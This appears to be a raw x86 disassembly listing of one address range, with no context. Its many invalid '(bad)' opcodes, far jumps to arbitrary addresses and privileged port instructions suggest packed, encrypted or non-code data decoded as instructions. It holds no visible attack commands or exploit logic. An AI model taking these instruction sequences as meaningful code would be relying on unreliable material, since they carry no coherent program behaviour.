  42b42b:	jne    0x42b3d5
  42b42d:	addr16 sti 
  42b42f:	xor    cl,dh
  42b431:	test   DWORD PTR [eax+0x2],eax
  42b434:	xor    eax,0xecc1effb
  42b439:	cld    
  42b43a:	loop   0x42b449
  42b43c:	jbe    0x42b43d
  42b43e:	sub    dl,dl
  42b440:	jmp    0xe39bae8d
  42b445:	icebp  
  42b446:	mov    edi,0xe8514fe0
  42b44b:	scas   eax,DWORD PTR es:[edi]
  42b44c:	cmp    eax,0xd48bf703
  42b451:	jge    0x42b448
  42b453:	je     0x42b4cc
  42b455:	xchg   DWORD PTR [esi],edi
  42b457:	and    al,0x0
  42b459:	add    BYTE PTR [eax],al
  42b45b:	add    BYTE PTR [eax],al
  42b45d:	pop    eax
  42b45e:	jmp    0x3eeb3c1
  42b463:	test   eax,eax
  42b465:	lock adc al,BYTE PTR [ebx-0x7af18fb4]
  42b46c:	leave  
  42b46d:	loopne 0x42b46d
  42b46f:	mov    BYTE PTR [ecx],al
  42b471:	xchg   edi,eax
  42b472:	retf   
  42b473:	loope  0x42b47d
  42b475:	shr    eax,cl
  42b477:	mov    ds:0x2b036a11,al
  42b47c:	shl    BYTE PTR [ebp-0x54],0x60
  42b480:	mov    esi,0x8758eb6d
  42b485:	in     al,0x6f
  42b487:	or     al,0x7f
  42b489:	fsub   st(2),st
  42b48b:	jb     0x42b4b4
  42b48d:	sub    al,0x77
  42b48f:	adc    bh,BYTE PTR [edi-0x34]
  42b492:	out    0x72,eax
  42b494:	add    al,0x87
  42b496:	stos   DWORD PTR es:[edi],eax
  42b497:	pusha  
  42b498:	mov    edi,0xf58d2d22
  42b49d:	int    0xdb
  42b49f:	add    bl,bh
  42b4a1:	mov    edx,0xb219ed23
  42b4a6:	cmp    cl,BYTE PTR [edi+eax*4]
  42b4a9:	mov    edi,0xee046eb3
  42b4ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b4af:	mov    edx,ecx
  42b4b1:	lea    edi,[ebx+edi*8+0xb8f92fa]
  42b4b8:	jg     0x42b46f
  42b4ba:	ficomp WORD PTR [eax-0x79]
  42b4bd:	mov    bl,0x82
  42b4bf:	pop    ebx
  42b4c0:	test   DWORD PTR [eax],0x0
  42b4c6:	jp     0x42b44b
  42b4c8:	scas   al,BYTE PTR es:[edi]
  42b4c9:	add    bl,dl
  42b4cb:	test   al,0x58
  42b4cd:	push   ebx
  42b4ce:	(bad)  
  42b4cf:	cmc    
  42b4d0:	and    cl,BYTE PTR [esi+ebp*8]
  42b4d3:	jp     0x42b457
  42b4d5:	cli    
  42b4d6:	loopne 0x42b4b5
  42b4d8:	xor    eax,eax
  42b4da:	pop    esi
  42b4db:	scas   eax,DWORD PTR es:[edi]
  42b4dc:	mov    eax,DWORD PTR [edi]
  42b4de:	not    BYTE PTR [edx-0x1]
  42b4e1:	jae    0x42b46d
  42b4e3:	mov    ds:0xcdac1f72,al
  42b4e8:	adc    al,0x49
  42b4ea:	test   eax,0x1c7545f0
  42b4ef:	cwde   
  42b4f0:	out    0xc0,al
  42b4f2:	and    BYTE PTR ds:0xbf65e700,ch
  42b4f8:	(bad)  
  42b4f9:	out    0x77,al
  42b4fb:	add    cl,BYTE PTR [edi+0x2187a702]
  42b501:	mov    WORD PTR [eax],?
  42b503:	jmp    0x42b55e
  42b505:	(bad)  
  42b506:	push   ebx
  42b508:	std    
  42b509:	and    ch,dh
  42b50b:	jb     0x42b4fe
  42b50d:	mov    WORD PTR [edi-0x5f8870d],?
  42b513:	mov    esp,0xf3e38a00
  42b518:	jmp    0x66933708
  42b51d:	les    esi,FWORD PTR [esi-0x79]
  42b520:	mov    cl,0x8b
  42b522:	lods   al,BYTE PTR ds:[esi]
  42b523:	jmp    0xc75d:0xf3bffad4
  42b52a:	add    BYTE PTR [eax],al
  42b52c:	add    BYTE PTR [eax],al
  42b52e:	add    BYTE PTR [edi+0x54],cl
  42b531:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b532:	or     BYTE PTR [ebp-0x79],dh
  42b535:	loop   0x42b4c1
  42b537:	cs push ds
  42b539:	loope  0x42b586
  42b53b:	sub    eax,0x9dd4e76d
  42b540:	dec    ebx
  42b541:	cmp    ah,ch
  42b543:	mov    dl,0x12
  42b545:	fwait
  42b546:	(bad)  
  42b547:	sti    
  42b548:	cli    
  42b549:	imul   edi,edi,0x6
  42b54c:	adc    ecx,DWORD PTR [edx+0x6e069978]
  42b552:	pop    eax
  42b553:	xchg   ecx,eax
  42b554:	push   es
  42b555:	outs   dx,BYTE PTR ds:[esi]
  42b556:	iret   
  42b557:	sti    
  42b558:	mov    ebx,0xf35e7880
  42b55d:	imul   ecx,DWORD PTR [ecx-0x771091ee],0x8ce76e23
  42b567:	inc    ebx
  42b568:	mov    BYTE PTR [ecx],ch
  42b56a:	jmp    0x42b5de
  42b56c:	dec    ebx
  42b56d:	inc    ecx
  42b56e:	rol    DWORD PTR [edx+0x353341f4],0x53
  42b575:	daa    
  42b576:	or     al,0x75
  42b578:	dec    ebp
  42b579:	add    BYTE PTR [edx+0x25],ah
  42b57c:	sub    bl,0xa9
  42b57f:	je     0x42b583
  42b581:	add    BYTE PTR [edi-0x1629955d],bh
  42b587:	jbe    0x42b58b
  42b589:	jmpw   0x7048
  42b58d:	fisubr DWORD PTR [edx-0x2304b08a]
  42b593:	add    BYTE PTR [eax],al
  42b595:	add    BYTE PTR [eax],al
  42b597:	add    BYTE PTR [esi],dh
  42b599:	adc    BYTE PTR [eax-0x17],al
  42b59c:	idiv   DWORD PTR [esi+0x6a74830b]
  42b5a2:	cmp    cl,BYTE PTR [ecx]
  42b5a4:	add    ch,BYTE PTR ss:[eax+0x20]
  42b5a8:	nop
  42b5a9:	jmp    0xd6f9:0xdfaad10d
  42b5b0:	in     eax,0xad
  42b5b2:	mov    ebp,0xe7f7b3cc
  42b5b7:	sti    
  42b5b8:	mov    dl,0xf8
  42b5ba:	cli    
  42b5bb:	in     al,0xc4
  42b5bd:	add    DWORD PTR [eax],eax
  42b5bf:	jmp    0x4392c3d0
  42b5c4:	jns    0x42b54b
  42b5c6:	je     0x42b621
  42b5c8:	idiv   DWORD PTR [edx+0xc4d91fa]
  42b5ce:	cli    
  42b5cf:	xchg   esi,eax
  42b5d0:	in     eax,dx
  42b5d1:	mov    dl,0x79
  42b5d3:	retf   0x7705
  42b5d6:	fadd   DWORD PTR [ecx+0x20]
  42b5d9:	repnz cli 
  42b5db:	jmp    0x77331d2e
  42b5e0:	pop    ebx
  42b5e1:	jg     0x42b627
  42b5e3:	cmp    DWORD PTR [esi-0x5c463e77],esp
  42b5e9:	fcmove st,st(5)
  42b5eb:	sti    
  42b5ec:	inc    eax
  42b5ed:	in     eax,dx
  42b5ee:	test   BYTE PTR [ecx],ch
  42b5f0:	imul   edx,DWORD PTR [edi+0x773665bf],0x8
  42b5f7:	add    BYTE PTR [edi],ch
  42b5f9:	(bad)  
  42b5fa:	pusha  
  42b5fb:	mov    ds:0x0,eax
  42b600:	add    BYTE PTR [eax+edx*8+0x39],ah
  42b604:	add    BYTE PTR [ebx],al
  42b606:	scas   eax,DWORD PTR es:[edi]
  42b607:	call   0x8d48d20d
  42b60c:	test   DWORD PTR [esi+0x2],ebx
  42b60f:	idiv   edi
  42b611:	ret    0xfac7
  42b614:	dec    esp
  42b616:	ds jne 0x42b612
  42b619:	dec    esp
  42b61a:	push   es
  42b61b:	leave  
  42b61c:	ret    
  42b61d:	addr16 pop es
  42b61f:	test   eax,eax
  42b621:	push   0xb7e84ffe
  42b626:	push   cs
  42b627:	idiv   bh
  42b629:	pop    edi
  42b62a:	daa    
  42b62b:	add    bl,al
  42b62d:	pop    esp
  42b62e:	xor    DWORD PTR [eax+0x68fd5],ebp
  42b634:	push   esi
  42b635:	sbb    DWORD PTR [ebx],esi
  42b637:	mov    dh,0xc8
  42b639:	jmp    0xb398b681
  42b63e:	sbb    DWORD PTR [ebx+edx*1],edx
  42b641:	dec    esp
  42b642:	push   es
  42b643:	cmp    BYTE PTR ds:0x39d9f4,0x9c
  42b64a:	js     0x42b65b
  42b64c:	call   0x38a500
  42b651:	sbb    dh,al
  42b653:	outs   dx,BYTE PTR ds:[esi]
  42b654:	push   cs
  42b655:	movaps XMMWORD PTR [ebp+edx*8-0x39fff961],xmm5
  42b65d:	pop    ecx
  42b65e:	popf   
  42b65f:	rol    DWORD PTR [ebx+0x4c],cl
  42b662:	add    al,0x4e
  42b664:	inc    DWORD PTR [eax]
  42b666:	add    BYTE PTR [eax],al
  42b668:	add    BYTE PTR [eax],al
  42b66a:	cmp    DWORD PTR ds:0x5d5c400b,ecx
  42b670:	ss loopne 0x42b692
  42b673:	add    eax,0x95240062
  42b678:	retf   
  42b679:	inc    ebx
  42b67a:	jne    0x42b657
  42b67c:	sti    
  42b67d:	adc    al,0xd9
  42b67f:	in     al,dx
  42b680:	ds add dh,bh
  42b683:	sub    al,BYTE PTR [ebx+0x68e4a9f1]
  42b689:	sti    
  42b68a:	ret    
  42b68b:	cmp    BYTE PTR [ebx],dl
  42b68d:	and    BYTE PTR [esi-0x65],ah
  42b690:	inc    BYTE PTR [ebp+esi*1-0xac2e471]
  42b697:	(bad)  
  42b699:	inc    DWORD PTR [ecx-0x7704ab0d]
  42b69f:	iret   
  42b6a0:	cmovo  esi,DWORD PTR [ebp-0x54]
  42b6a4:	mov    esi,0x781af859
  42b6a9:	or     ch,dh
  42b6ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b6ac:	and    al,BYTE PTR [esp+edi*8]
  42b6af:	fldcw  WORD PTR [esi-0x781f2200]
  42b6b5:	ror    esi,0xbd
  42b6b8:	xor    al,al
  42b6ba:	mov    bh,0xde
  42b6bc:	(bad)  
  42b6bd:	push   esp
  42b6be:	(bad)  
  42b6bf:	scas   al,BYTE PTR es:[edi]
  42b6c0:	jg     0x42b6ad
  42b6c2:	test   DWORD PTR [ebx+0x3a],ebx
  42b6c5:	test   al,0xc8
  42b6c7:	sbb    eax,DWORD PTR [eax+eax*1]
  42b6ca:	inc    ebx
  42b6cb:	adc    BYTE PTR [ebx+0x2f],dh
  42b6ce:	add    BYTE PTR [eax],al
  42b6d0:	add    BYTE PTR [eax],al
  42b6d2:	add    bl,dl
  42b6d4:	mov    ds:0x31753ed1,al
  42b6d9:	std    
  42b6da:	adc    al,0x69
  42b6dc:	in     al,dx
  42b6dd:	ds add ch,dh
  42b6e0:	aad    0xa6
  42b6e2:	aam    0xb6
  42b6e4:	fsin   
  42b6e6:	je     0x42b66a
  42b6e8:	xchg   ecx,eax
  42b6e9:	mov    al,ds:0x837162f9
  42b6ee:	mov    edi,0x247fe7e1
  42b6f3:	and    DWORD PTR [edi+0x275003f],edx
  42b6f9:	sub    eax,DWORD PTR [esi]
  42b6fb:	or     eax,0x7403a5d6
  42b700:	pop    eax
  42b701:	push   edx
  42b702:	push   ss
  42b703:	lea    edx,[ebx]
  42b705:	test   eax,0xa1049303
  42b70a:	mov    gs,WORD PTR [ecx-0x7dafaf0e]
  42b710:	add    ch,cl
  42b712:	mov    BYTE PTR [ecx+0xa93e3fa],bh
  42b718:	lock call 0xe945ba89
  42b71e:	add    esp,DWORD PTR [ebp+0x2beb2a7b]
  42b724:	or     al,0xe9
  42b726:	add    edx,DWORD PTR [ebx+0x6]
  42b729:	je     0x42b771
  42b72b:	jno    0x42b77f
  42b72d:	outs   dx,BYTE PTR ds:[esi]
  42b72e:	(bad)
  42b731:	int    0x3
  42b733:	jne    0x42b7b2
  42b735:	imul   edi,edi,0x0
  42b738:	add    BYTE PTR [eax],al
  42b73a:	add    BYTE PTR [eax],al
  42b73c:	repz enter 0x42d0,0x61
  42b741:	add    ch,cl
  42b743:	ins    DWORD PTR es:[edi],dx
  42b744:	popa   
  42b745:	out    dx,eax
  42b746:	pop    ebx
  42b747:	adc    al,0xae
  42b749:	jne    0x42b718
  42b74b:	sti    
  42b74c:	sbb    DWORD PTR [esi-0x25],0xa4837543
  42b753:	or     dl,dh
  42b755:	enter  0x67c0,0x6a
  42b759:	add    ch,cl
  42b75b:	pop    edx
  42b75c:	das    
  42b75d:	mov    ecx,0x557508a6
  42b762:	outs   dx,BYTE PTR ds:[esi]
  42b763:	call   0x6f965d
  42b768:	jne    0x42b76c
  42b76a:	imul   edi,DWORD PTR [ecx],0x425d13d
  42b770:	je     0x42b7c5
  42b772:	adc    edx,DWORD PTR [ebx-0xe]
  42b775:	leave  
  42b776:	(bad)  
  42b777:	std    
  42b778:	ja     0x42b79a
  42b77a:	rol    BYTE PTR [eax-0x16fffe9c],0xed
  42b781:	mov    ch,0xcf
  42b783:	pop    esp
  42b784:	ds in  al,dx
  42b786:	out    0xd3,eax
  42b788:	cmp    cl,ch
  42b78a:	cli    
  42b78b:	pop    esp
  42b78c:	mov    ah,0xc6
  42b78e:	dec    edi
  42b78f:	inc    esi
  42b790:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b791:	cli    
  42b792:	xchg   BYTE PTR [edi],ah
  42b794:	rcr    edx,0x2a
  42b797:	ss push cs
  42b799:	in     al,dx
  42b79a:	test   BYTE PTR [edx],dl
  42b79c:	test   BYTE PTR ds:0xac8d,bl
  42b7a2:	add    BYTE PTR [eax],al
  42b7a4:	add    dl,al
  42b7a6:	ds push 0x301e31
  42b7ac:	cmp    DWORD PTR [ecx+0x2],0x15ee6900
  42b7b3:	mov    al,ds:0xf30236da
  42b7b8:	and    DWORD PTR [ebx-0x3e],edi
  42b7bb:	stc    
  42b7bc:	sub    DWORD PTR [ebx],edx
  42b7be:	fld    DWORD PTR [eax]
  42b7c0:	jmp    0xb00c3f3b
  42b7c5:	jns    0x42b7c9
  42b7c7:	inc    ecx
  42b7c8:	xor    eax,DWORD PTR [ecx+ebp*8-0x18]
  42b7cc:	mov    ds:0x6a000276,eax
  42b7d1:	aad    0xc6
  42b7d3:	sti    
  42b7d4:	(bad)  
  42b7d5:	lahf   
  42b7d6:	out    dx,al
  42b7d7:	mov    esp,DWORD PTR [esi+edx*1-0x14]
  42b7db:	cli    
  42b7dc:	mov    dh,0x26
  42b7de:	jge    0x42b764
  42b7e0:	mov    eax,ds:0x91faeb82
  42b7e5:	stc    
  42b7e6:	idiv   edx
  42b7e8:	sahf   
  42b7e9:	jmp    0x42b860
  42b7eb:	or     al,0x62
  42b7ed:	dec    ebx
  42b7ee:	jg     0x42b774
  42b7f0:	mov    eax,ds:0xfae962
  42b7f5:	add    al,0xa9
  42b7f7:	icebp  
  42b7f8:	(bad)  
  42b7f9:	fild   DWORD PTR [esi+0x21400f1]
  42b7ff:	add    BYTE PTR [esi+0x51],dh
  42b802:	pusha  
  42b803:	sti    
  42b804:	pop    esi
  42b805:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b806:	dec    edx
  42b807:	sub    ecx,ecx
  42b809:	add    BYTE PTR [eax],al
  42b80b:	add    BYTE PTR [eax],al
  42b80d:	add    bh,cl
  42b80f:	in     al,dx
  42b810:	dec    BYTE PTR [esi]
  42b812:	mov    cl,0xc6
  42b814:	fs add bl,dl
  42b817:	jl     0x42b7d9
  42b819:	push   0xc
  42b81b:	sbb    eax,0xd078e8c1
  42b820:	cmc    
  42b821:	call   FWORD PTR [ebx]
  42b823:	mov    ah,0xb2
  42b825:	mov    esp,0x830041a9
  42b82a:	pop    ebx
  42b82b:	push   es
  42b82c:	jne    0x42b866
  42b82e:	mov    DWORD PTR [edx+0x8],eax
  42b831:	push   eax
  42b832:	pop    ecx
  42b833:	cmp    BYTE PTR [edx+0x4ae87bfb],0x8b
  42b83a:	(bad)  
  42b83b:	jl     0x42b898
  42b83d:	or     al,0x65
  42b83f:	mov    dl,0xba
  42b841:	sti    
  42b842:	retf   
  42b843:	jmp    0x42b827
  42b845:	or     eax,0x8bf5ebd8
  42b84a:	pushf  
  42b84b:	ins    DWORD PTR es:[edi],dx
  42b84c:	icebp  
  42b84d:	jne    0x42b808
  42b84f:	test   al,0xe8
  42b851:	add    DWORD PTR [ecx+eax*1-0xa137a73],ebx
  42b858:	cmc    
  42b859:	call   edx
  42b85b:	push   es
  42b85c:	add    BYTE PTR [eax+0x65],al
  42b85f:	pop    ebp
  42b860:	stc    
  42b861:	jmp    0x38a310
  42b866:	pop    ss
  42b867:	pop    ebp
  42b868:	or     al,0x89
  42b86a:	cmp    esi,edi
  42b86c:	div    BYTE PTR [ebp-0x7c]
  42b86f:	test   BYTE PTR [ebx-0x3c],al
  42b872:	add    BYTE PTR [eax],al
  42b874:	add    BYTE PTR [eax],al
  42b876:	add    BYTE PTR [ebp+0x2d],dh
  42b879:	push   ecx
  42b87a:	push   eax
  42b87b:	frstor [ebx-0x6c8ac128]
  42b881:	push   ecx
  42b882:	out    dx,eax
  42b883:	pop    ebx
  42b884:	ins    BYTE PTR es:[edi],dx
  42b885:	mov    dl,bh
  42b887:	mov    gs,esi
  42b889:	add    dh,BYTE PTR [ebx+esi*2+0x15]
  42b88d:	in     al,dx
  42b88e:	retf   
  42b88f:	jo     0x42b8f6
  42b891:	stc    
  42b892:	mov    eax,0xfffeda4b
  42b897:	add    BYTE PTR [esi-0x2c],bl
  42b89a:	cld    
  42b89b:	sub    bh,BYTE PTR [esi+edi*4]
  42b89e:	jmp    DWORD PTR [edx]
  42b8a0:	fwait
  42b8a1:	inc    ebp
  42b8a2:	jne    0x42b8c0
  42b8a4:	jno    0x42b86b
  42b8a6:	pop    edx
  42b8a7:	mov    bl,0x90
  42b8a9:	lds    edi,FWORD PTR [ebp-0x78b62483]
  42b8af:	adc    DWORD PTR [eax-0x20],ebx
  42b8b2:	div    esp
  42b8b4:	inc    BYTE PTR [edi+0x4]
  42b8b7:	jne    0x42b894
  42b8b9:	push   ebx
  42b8ba:	push   edx
  42b8bb:	inc    edx
  42b8bc:	dec    esi
  42b8bd:	mov    al,0x23
  42b8bf:	push   ebp
  42b8c0:	(bad)  
  42b8c2:	dec    ebp
  42b8c4:	pushf  
  42b8c5:	mov    ebp,0x4065d2f9
  42b8ca:	and    al,0x69
  42b8cc:	mov    esi,edi
  42b8ce:	je     0x42b93d
  42b8d0:	jo     0x42b893
  42b8d2:	dec    edi
  42b8d3:	int    0xd8
  42b8d5:	clc    
  42b8d6:	cli    
  42b8d7:	mov    dl,0x65
  42b8d9:	inc    ebx
  42b8da:	and    al,0x0
  42b8dc:	add    BYTE PTR [eax],al
  42b8de:	add    BYTE PTR [eax],al
  42b8e0:	test   DWORD PTR [edx],ebp
  42b8e2:	push   0x1
  42b8e4:	data16 mov al,ds:0xdb74b853
  42b8ea:	(bad)  
  42b8eb:	jg     0x42b90a
  42b8ed:	mov    ds:0xb753ed7,eax
  42b8f2:	xchg   DWORD PTR [ebx+0x59],eax
  42b8f5:	add    cl,ch
  42b8f7:	mov    bl,BYTE PTR [esi]
  42b8f9:	es leave 
  42b8fb:	clc    
  42b8fc:	mov    DWORD PTR [esi],esp
  42b8fe:	stc    
  42b8ff:	inc    ebx
  42b900:	jne    0x42b887
  42b902:	test   al,0x6e
  42b904:	mov    edi,DWORD PTR [ebp+0x2c]
  42b907:	and    BYTE PTR [ecx+0x52],ch
  42b90a:	ins    BYTE PTR es:[edi],dx
  42b90b:	aas    
  42b90c:	cdq    
  42b90d:	push   cs
  42b90e:	sbb    DWORD PTR [edi+0x53c526b6],eax
  42b914:	lock outs dx,BYTE PTR ds:[esi]
  42b916:	or     eax,0x56174d18
  42b91b:	stc    
  42b91c:	das    
  42b91d:	fsub   st,st(5)
  42b91f:	test   BYTE PTR [edx],dh
  42b921:	in     al,dx
  42b922:	pop    edi
  42b923:	aas    
  42b924:	pop    ecx
  42b925:	push   ss
  42b926:	data16 sti 
  42b928:	pop    ds
  42b929:	cld    
  42b92a:	xchg   BYTE PTR fs:[edx],dl
  42b92d:	in     al,dx
  42b92e:	call   0x653e836f
  42b933:	jle    0x42b937
  42b935:	in     al,dx
  42b936:	call   0x16937bf
  42b93b:	add    ebp,DWORD PTR [eax+0x31]
  42b93e:	mov    ecx,0xf92666f8
  42b943:	xchg   BYTE PTR [eax],al
  42b945:	add    BYTE PTR [eax],al
  42b947:	add    BYTE PTR [eax],al
  42b949:	ds es in eax,0x86
  42b94d:	es daa 
  42b94f:	mov    eax,ds:0x2a027504
  42b954:	jg     0x42b8ec
  42b956:	dec    edx
  42b957:	out    0x3,al
  42b959:	jne    0x42b95b
  42b95b:	jmp    0xee1d2e63
  42b960:	imul   DWORD PTR [edi+0x5170d1eb]
  42b966:	(bad)  
  42b967:	pop    ebp
  42b968:	hlt    
  42b969:	call   0x3479:0x9ff5f4e7
  42b970:	and    BYTE PTR [ecx-0x36dffd1],al
  42b976:	jg     0x42b99b
  42b978:	mov    ecx,0x39000278
  42b97d:	in     al,dx
  42b97e:	aas    
  42b97f:	and    al,0x3d
  42b981:	add    BYTE PTR [edi+0x24],al
  42b984:	xor    eax,0x8ef8f359
  42b989:	push   0xffffff84
  42b98b:	jae    0x42b95a
  42b98d:	push   0x33
  42b98f:	out    dx,eax
  42b990:	cmc    
  42b991:	jnp    0x42b916
  42b993:	dec    ebx
  42b994:	int    0x72
  42b996:	adc    ecx,0x5c
  42b999:	mov    ch,0x26
  42b99b:	pop    eax
  42b99c:	push   ecx
  42b99d:	mov    ebx,esi
  42b99f:	cli    
  42b9a0:	pop    esi
  42b9a1:	inc    BYTE PTR [ebp+0xc]
  42b9a4:	adc    dh,BYTE PTR [esi]
  42b9a6:	outs   dx,DWORD PTR ds:[esi]
  42b9a7:	(bad)  
  42b9a8:	pop    edi
  42b9a9:	imul   ebp,DWORD PTR [ecx+0xe8e9],0x76000000
  42b9b3:	add    cl,BYTE PTR [ebp+0x1625565]
  42b9b9:	jmp    0xa95a3434
  42b9be:	mov    cl,0x75
  42b9c0:	div    BYTE PTR [edx-0x4b]
  42b9c3:	es or  al,0x12
  42b9c6:	test   DWORD PTR [ecx+0x276e8e9],ebp
  42b9cc:	lea    esp,[ebp-0x6b]
  42b9cf:	bound  eax,QWORD PTR [ecx]
  42b9d1:	jmp    0xa95a344c
  42b9d6:	inc    ecx
  42b9d7:	jne    0x42b9cf
  42b9d9:	mov    edx,0x925a47b6
  42b9de:	out    dx,eax
  42b9df:	in     eax,0x5c
  42b9e1:	stos   DWORD PTR es:[edi],eax
  42b9e2:	outs   dx,BYTE PTR ds:[esi]
  42b9e3:	add    dl,BYTE PTR [ebp+0x72]
  42b9e6:	call   0x4fee:0x35645251
  42b9ed:	inc    ebx
  42b9ee:	js     0x42b9ca
  42b9f0:	lds    eax,FWORD PTR [eax]
  42b9f2:	mov    dl,0xf3
  42b9f4:	cmc    
  42b9f5:	test   esp,ebx
  42b9f7:	pop    edx
  42b9f8:	or     al,BYTE PTR [ebx+0x74feea41]
  42b9fe:	mov    al,ds:0xe4502a77
  42ba03:	pop    ebp
  42ba04:	or     al,0xfe
  42ba06:	adc    edi,DWORD PTR [ebp-0x40]
  42ba09:	jmp    0x42ba5f
  42ba0b:	push   esi
  42ba0c:	call   0xf632fa70
  42ba11:	xor    ecx,DWORD PTR [eax+edx*2]
  42ba14:	leave  
  42ba15:	ret    
  42ba16:	add    BYTE PTR [eax],al
  42ba18:	add    BYTE PTR [eax],al
  42ba1a:	add    BYTE PTR [ecx+0x7d],ch
  42ba1d:	out    0x51,al
  42ba1f:	push   0x39
  42ba21:	lea    eax,[ebp-0x30]
  42ba24:	push   ebp
  42ba25:	bound  eax,QWORD PTR [edx]
  42ba27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ba28:	(bad)  
  42ba29:	clc    
  42ba2a:	call   ebx
  42ba2c:	jl     0x42ba18
  42ba2e:	test   edx,ecx
  42ba30:	pop    ecx
  42ba31:	pop    ss
  42ba32:	mov    ebx,ecx
  42ba34:	icebp  
  42ba35:	mov    ds:0x830dd901,al
  42ba3a:	dec    ebp
  42ba3b:	add    al,0x38
  42ba3d:	bound  edx,QWORD PTR ds:0xe855dd6d
  42ba43:	jg     0x42ba37
  42ba45:	clc    
  42ba46:	(bad)  
  42ba47:	mov    edx,0x920c22dd
  42ba4c:	lock stos BYTE PTR es:[edi],al
  42ba4e:	add    DWORD PTR [edi-0x3],esi
  42ba51:	dec    ebp
  42ba52:	call   0x38bc29
  42ba57:	push   ds
  42ba58:	(bad)  
  42ba59:	push   ebp
  42ba5a:	pop    esi
  42ba5b:	test   ebx,eax
  42ba5d:	(bad)  
  42ba5e:	(bad)  
  42ba5f:	jmp    0x78c6a0e0
  42ba64:	in     eax,dx
  42ba65:	jg     0x42ba53
  42ba67:	sub    cl,ch
  42ba69:	cli    
  42ba6a:	jmp    FWORD PTR [ebx-0x11]
  42ba6d:	jae    0x42ba77
  42ba6f:	jne    0x42ba34
  42ba71:	pushf  
  42ba72:	cli    
  42ba73:	mov    ds:0x20bf7fb8,al
  42ba78:	in     al,dx
  42ba79:	cmp    DWORD PTR [ebx+0x59],0x55e6f3
  42ba80:	add    BYTE PTR [eax],al
  42ba82:	add    BYTE PTR [eax],al
  42ba84:	xchg   ebx,eax
  42ba85:	mov    cl,0xf4
  42ba87:	xchg   BYTE PTR [eax],dh
  42ba89:	jecxz  0x42ba0c
  42ba8b:	adc    DWORD PTR [ecx-0x73],0xffffffff
  42ba8f:	push   DWORD PTR [ebp+0x2b]
  42ba92:	adc    ax,0x64ca
  42ba96:	mov    ebp,0xf18ed9e7
  42ba9b:	cli    
  42ba9c:	int    0xfb
  42ba9e:	cli    
  42ba9f:	call   DWORD PTR [edx+0x56]
  42baa2:	inc    eax
  42baa3:	and    al,0x79
  42baa5:	add    eax,0xce425004
  42baaa:	adc    dh,BYTE PTR ds:[ebp-0x7e3c8025]
  42bab1:	test   al,0x87
  42bab3:	in     al,0xc8
  42bab5:	sbb    eax,0x64c80000
  42baba:	call   0x68cc7f0f
  42babf:	or     al,0x12
  42bac1:	scas   al,BYTE PTR es:[edi]
  42bac2:	push   es
  42bac3:	call   0xfb3799a5
  42bac8:	lock popf 
  42baca:	repnz dec edi
  42bacc:	(bad)  
  42bacd:	jbe    0x42bab5
  42bacf:	repnz lock pop es
  42bad2:	cmc    
  42bad3:	xchg   ch,ah
  42bad5:	push   ebp
  42bad6:	jmp    0x94e6:0xbecd7974
  42badd:	je     0x42bb1a
  42badf:	cld    
  42bae0:	test   BYTE PTR [edx],0x8
  42bae3:	jb     0x42bb5b
  42bae5:	test   DWORD PTR [edx],eax
  42bae7:	pop    eax
  42bae8:	add    BYTE PTR [eax],al
  42baea:	add    BYTE PTR [eax],al
  42baec:	add    BYTE PTR ds:0x6d74f391,ah
  42baf2:	add    ah,dl
  42baf4:	push   cs
  42baf5:	jno    0x42bb07
  42baf7:	sub    DWORD PTR [edx+ebp*1],eax
  42bafa:	mov    esi,0x688d4de4
  42baff:	fdivrp st(5),st
  42bb01:	lahf   
  42bb02:	mov    cl,0xe7
  42bb04:	push   ebp
  42bb05:	mov    esp,0x2003e4c3
  42bb0a:	jge    0x42bad0
  42bb0c:	push   edx
  42bb0d:	and    al,0x50
  42bb0f:	adc    al,BYTE PTR [edi+0x6c38e631]
  42bb15:	cmp    eax,0x5d03e903
  42bb1a:	mov    ch,0x93
  42bb1c:	hlt    
  42bb1d:	pop    edi
  42bb1e:	jl     0x42bab8
  42bb20:	jle    0x42bb86
  42bb22:	outs   dx,DWORD PTR ds:[esi]
  42bb23:	in     eax,0x88
  42bb25:	mov    ecx,0xd3030ee6
  42bb2a:	add    bl,BYTE PTR [esi-0x3b]
  42bb2d:	pop    edx
  42bb2e:	sar    edi,0x3
  42bb31:	jne    0x42bbae
  42bb33:	pusha  
  42bb34:	jle    0x42bb65
  42bb36:	outs   dx,BYTE PTR ds:[esi]
  42bb37:	jecxz  0x42bb86
  42bb39:	sbb    eax,0x1ff5de44
  42bb3e:	jl     0x42bb61
  42bb40:	push   esp
  42bb41:	mov    edi,0xfa4e25b9
  42bb46:	(bad)  
  42bb47:	gs jbe 0x42bbc7
  42bb4a:	add    dl,BYTE PTR [esi-0x16a39a92]
  42bb50:	imul   eax,DWORD PTR [eax],0x0
  42bb53:	add    BYTE PTR [eax],al
  42bb55:	add    BYTE PTR ds:0xa203e903,ch
  42bb5b:	ret    0x3910
  42bb5e:	jmp    0xa62acd4a
  42bb63:	jne    0x42bb08
  42bb65:	or     eax,DWORD PTR [ebp+0x5c]
  42bb68:	jmp    0x742a2fd6
  42bb6d:	or     ebx,ebp
  42bb6f:	push   ebx
  42bb70:	add    BYTE PTR [esi+0x29850276],cl
  42bb76:	dec    ebx
  42bb77:	(bad)  
  42bb78:	sub    eax,0xfb0ad2a9
  42bb7d:	push   esp
  42bb7e:	test   eax,0x76e9c85f
  42bb83:	add    ch,al
  42bb85:	cli    
  42bb86:	mov    ch,ah
  42bb88:	cli    
  42bb89:	(bad)  
  42bb8a:	or     al,0xfa
  42bb8c:	test   DWORD PTR [ecx-0x48fa0c57],esp
  42bb92:	xchg   BYTE PTR [ebp-0x42],bh
  42bb95:	adc    ah,BYTE PTR [eax+ebp*4]
  42bb98:	add    ebp,ecx
  42bb9a:	sti    
  42bb9b:	fdivp  st(7),st
  42bb9d:	adc    al,0x6b
  42bb9f:	aas    
  42bba0:	je     0x42bb8c
  42bba2:	stos   DWORD PTR es:[edi],eax
  42bba3:	ret    0x3be
  42bba6:	mov    ds:0x8b13bf4a,al
  42bbab:	dec    edx
  42bbac:	mov    edi,0x7edbca14
  42bbb1:	test   DWORD PTR [ebp+0x7f],esp
  42bbb4:	inc    esp
  42bbb5:	frstor [ebx+0xbfd717]
  42bbbb:	add    BYTE PTR [eax],al
  42bbbd:	add    BYTE PTR [eax],al
  42bbbf:	iret   
  42bbc0:	jns    0x42bc1e
